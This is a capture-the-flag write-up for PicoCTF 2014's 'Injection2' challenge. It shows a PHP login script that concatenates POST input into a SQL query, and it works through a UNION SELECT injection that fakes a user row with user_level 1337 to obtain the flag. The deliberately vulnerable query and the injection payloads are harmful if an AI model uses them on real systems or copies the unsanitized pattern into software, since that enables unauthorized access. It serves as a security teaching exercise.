###Injection2

This challenges comes from PicoCTF 2014. We are to perform an SQL injection on the web application we are provided with. The source code for the PHP file making the query is as follows:
```
<?php
include "config.php";
$con = mysqli_connect("localhost", "sql2", "sql2", "sql2");
$username = $_POST["username"];
$password = $_POST["password"];
$debug = $_POST["debug"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);

if (intval($debug)) {
  echo "<pre>";
  echo "username: ", htmlspecialchars($username), "\n";
  echo "password: ", htmlspecialchars($password), "\n";
  echo "SQL query: ", htmlspecialchars($query), "\n";
  if (mysqli_errno($con) !== 0) {
    echo "SQL error: ", htmlspecialchars(mysqli_error($con)), "\n";
  }
  echo "</pre>";
}

$logged_in = false;
if (mysqli_num_rows($result) === 1) {
  $row = mysqli_fetch_array($result);
  if ($row["password"] === $password) {
    $logged_in = true;
    echo "<h1>Logged in!</h1>";
    echo "<pre>User level: ", $row["user_level"],  "</pre>";
    if ($row["user_level"] >= 1337) {
      echo "<p>Your flag is: $FLAG</p>";
    } else {
      echo "<p>Only user levels 1337 or above can see the flag.</p>";
    }
  }
}

if (!$logged_in) {
  echo "<h1>Login failed.</h1>";
}
?>
```
From the above it is clear that to get the flag we need to bypass three conditions:

1. # of rows returned from the query === 1 (triple equal sign checks for identical value as well as datatype)
2. our "password" variable supplied via POST method must match the "password" field of the result
3. the "user_level" field must be greater or equal to 1337

Without the possiblity to register any user to the database, it becomes certain that we somehow have to "fake" the query result. Since there is no sanitization or escaping of user input,
we can achieve this by appending ```UNION SELECT``` query.

Basically, a ```UNION``` clause merges the result of multiple ```SELECT``` statements. For it to work, two conditions must be satisfied:

1. The # of columns in the SELECT statements must match (UNION is based on the # of columns in the FIRST query)
2. The data types of the corresponding columns in the SELECT statements must match (or must be convertable to match)

Note on the difference between ```UNION SELECT``` and ```UNION ALL SELECT```:

```UNION SELECT``` effectively removes duplicate results i.e. perform DISTINCT, while ```UNION ALL``` does not.

Now, there is also a convenient clause for SQL query, that is, ```AS```. Using this, we can "fake" entries in the table. On top of this, we want to nullify the orignal query, and this can be achieved doing the opposite
of what we normally do - add the condition ```AND 1=0``` which always returns false, instead of ```OR 1=1``` which always returns true.

The original query is 
```$query = "SELECT * FROM users WHERE username='$username'"```
and we can attach the following string:
```' AND 1=0 UNION SELECT 'admin' AS username, 'password' AS password, 1337 AS user_level #``` 
(```#``` can be replaced by ```-- ```. Note the a space that follows!).

With the debug mode turned on (turn on by editing the ```hidden``` input field in HTML), it gives the following error message:
```
SQL error: The used SELECT statements have a different number of columns
```
Different number of columns! The only way we can figure out is just by keep adding columns one by one till they match (just append ```,1``` for the equivalence of adding a column). So do
```
' AND 1=0 UNION SELECT 'admin' AS username, 'password' AS password, 1337 AS user_level, 1 #
```
When we have 5 columns in the second ```SELECT``` statement, it gives out no more error: however, we still don't see the flag. This means, that the data types of the corresponding columns do not match,
so try different orderings. 

In the end, put the following query into the username input field, 

```
' AND 1=0 UNION SELECT 'admin' AS username, 1, 'password' AS password, 1, 1337 AS user_level, 1 #
```
with "password" in the password input field. This prints 
```Your flag is: flag_nJZAKGWYt7YfzmTsCV```

